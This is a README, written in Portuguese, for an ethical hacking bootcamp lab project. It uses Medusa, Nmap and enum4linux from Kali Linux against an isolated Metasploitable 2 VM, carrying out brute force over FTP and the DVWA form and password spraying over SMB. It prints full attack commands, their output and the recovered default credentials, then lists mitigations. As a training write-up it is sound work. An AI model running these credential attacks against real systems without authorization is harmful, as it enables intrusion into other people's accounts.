# Brute Force com Medusa e Kali Linux

Projeto prático do bootcamp de Ethical Hacking — [DIO](https://www.dio.me/).

Neste projeto configurei um ambiente virtualizado com **Kali Linux** e **Metasploitable 2** para simular ataques de força bruta e password spraying nos protocolos FTP, HTTP e SMB, usando o **Medusa** como ferramenta principal. Todo o tráfego fica restrito à rede interna entre as duas VMs — sem exposição à internet.

> ⚠️ **Aviso Legal**: ambiente 100% isolado, fins educacionais. Reproduzir em sistemas sem autorização expressa é ilegal.

---

## Ambiente

**VM Alvo — Metasploitable 2**
Download: [sourceforge.net/projects/metasploitable](https://sourceforge.net/projects/metasploitable/)
É uma VM Linux propositalmente cheia de vulnerabilidades, criada pelo time do Metasploit para treino. O arquivo baixado é um `.vmdk` que importo direto no VirtualBox.

**VM Atacante — Kali Linux**
Já vem com Medusa, Nmap, enum4linux e smbclient instalados.

**Rede**
Ambas as VMs com adaptador em modo **Host-only** no VirtualBox — ficam na mesma rede isolada, sem internet.

```
Kali Linux       →  192.168.56.102
Metasploitable 2 →  192.168.56.101
```

Para descobrir o IP da Metasploitable depois de subir a VM:
```bash
# na VM Metasploitable
ifconfig

# ou do Kali, varredura na rede
nmap -sn 192.168.56.0/24
```

---

## Cenário 1 — Força Bruta em FTP

Primeiro confirmei que o serviço FTP estava rodando:

```bash
nmap -p 21 192.168.56.101
# 21/tcp open  ftp  vsftpd 2.3.4
```

Rodei o ataque com Medusa passando as wordlists de usuários e senhas:

```bash
medusa -h 192.168.56.101 \
       -U wordlists/usuarios.txt \
       -P wordlists/senhas.txt \
       -M ftp \
       -t 4 \
       -f \
       -v 6
```

Resultado:
```
Medusa v2.2 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks
...
ACCOUNT FOUND: [ftp] Host: 192.168.56.101 User: msfadmin Password: msfadmin [SUCCESS]
```

Validei o acesso:
```bash
ftp 192.168.56.101
# Connected to 192.168.56.101.
# 220 (vsFTPd 2.3.4)
# Name: msfadmin
# Password: msfadmin
# 230 Login successful.
```

A credencial `msfadmin:msfadmin` é a padrão da VM — nunca foi alterada. Em um ambiente real isso seria o pior cenário possível: serviço exposto com senha padrão.

---

## Cenário 2 — Força Bruta no Formulário Web (DVWA)

A Metasploitable 2 já vem com o **DVWA** (Damn Vulnerable Web Application) instalado.

Acessei `http://192.168.56.101/dvwa`, fiz login com `admin:password`, fui em **DVWA Security** e coloquei o nível em **Low** (sem proteção nenhuma). Depois naveguei até **Brute Force** para identificar o formulário.

Ataque com o módulo HTTP do Medusa:

```bash
medusa -h 192.168.56.101 \
       -u admin \
       -P wordlists/senhas_web.txt \
       -M http \
       -m "DIR:/dvwa/vulnerabilities/brute/" \
       -m "FORM:username=&password=&Login=Login" \
       -m "DENY:Username and/or password incorrect" \
       -t 1 \
       -f \
       -v 6
```

A flag `-m "DENY"` define o texto que aparece quando a senha está errada — o Medusa detecta sucesso quando essa mensagem **não** aparece na resposta.

Resultado:
```
ACCOUNT FOUND: [http] Host: 192.168.56.101 User: admin Password: password [SUCCESS]
```

---

## Cenário 3 — Enumeração SMB e Password Spraying

**Passo 1 — Checar se SMB está ativo:**

```bash
nmap -p 139,445 192.168.56.101
# 139/tcp open  netbios-ssn Samba smbd 3.X
# 445/tcp open  microsoft-ds Samba smbd 3.X
```

**Passo 2 — Enumerar usuários com enum4linux:**

```bash
enum4linux -U 192.168.56.101
```

Saída relevante:
```
[+] Enumerating users using SID S-1-5-21-...
user:[msfadmin] rid:[0x3e8]
user:[service]  rid:[0x3f2]
user:[postgres] rid:[0x3f4]
user:[sys]      rid:[0x3f6]
user:[klog]     rid:[0x3f8]
user:[root]     rid:[0x3ea]
```

Com esses nomes em mãos, montei o `wordlists/usuarios.txt` e rodei o **password spraying** — diferente do brute force clássico, aqui teste poucas senhas em muitos usuários ao mesmo tempo, o que reduz o risco de bloqueio por conta:

```bash
medusa -h 192.168.56.101 \
       -U wordlists/usuarios.txt \
       -P wordlists/senhas.txt \
       -M smbnt \
       -t 2 \
       -f \
       -v 6
```

Resultado:
```
ACCOUNT FOUND: [smbnt] Host: 192.168.56.101 User: msfadmin Password: msfadmin [SUCCESS]
```

**Passo 3 — Validar com smbclient:**

```bash
smbclient //192.168.56.101/tmp -U msfadmin
# Enter WORKGROUP\msfadmin's password: msfadmin
# smb: \> ls
#   .                       D    0  ...
#   ..                      D    0  ...
```

Acesso confirmado ao compartilhamento `/tmp` da máquina.

---

## Wordlists

As wordlists deste projeto são reduzidas, pensadas para a Metasploitable 2 (VM com credenciais propositalmente fracas). Em um pentest real, o Kali já vem com a **rockyou.txt** em `/usr/share/wordlists/rockyou.txt.gz` — uma das maiores wordlists de senhas vazadas.

---

## Mitigações

O que teria impedido esses ataques em um ambiente real:

**FTP e SMB**
- Desabilitar FTP; usar SFTP (SSH) ou FTPS
- Desabilitar SMBv1; habilitar signing obrigatório no SMB
- Bloquear as portas 21, 139 e 445 no firewall externo — esses serviços não deveriam estar acessíveis fora da rede interna
- Instalar `fail2ban` para bloquear IPs após N tentativas falhas

**Formulário web**
- Rate limiting por IP (ex: nginx `limit_req`)
- CAPTCHA após a primeira falha
- Token CSRF no formulário

**Senhas**
- Nunca deixar credencial padrão — `msfadmin:msfadmin` foi quebrada na primeira tentativa
- Política de senha forte: mínimo 12 caracteres, sem palavras de dicionário
- MFA onde possível

---

## O que aprendi

A Metasploitable 2 deixou claro que o maior vetor de entrada não é uma vulnerabilidade sofisticada — é uma senha padrão nunca trocada. O `msfadmin:msfadmin` aparece nos três cenários e é a primeira entrada da wordlist.

Password spraying no SMB foi o cenário mais interessante: a enumeração com `enum4linux` expôs todos os usuários do sistema sem autenticação nenhuma. Isso, somado a senhas fracas, significa que qualquer pessoa na rede interna teria acesso em segundos.

---

## Referências

- [Metasploitable 2 — Download (SourceForge)](https://sourceforge.net/projects/metasploitable/)
- [DVWA — Damn Vulnerable Web Application](https://github.com/digininja/DVWA)
- [Kali Linux](https://www.kali.org/)
- [Nmap Reference Guide](https://nmap.org/book/man.html)
- [fail2ban](https://github.com/fail2ban/fail2ban)
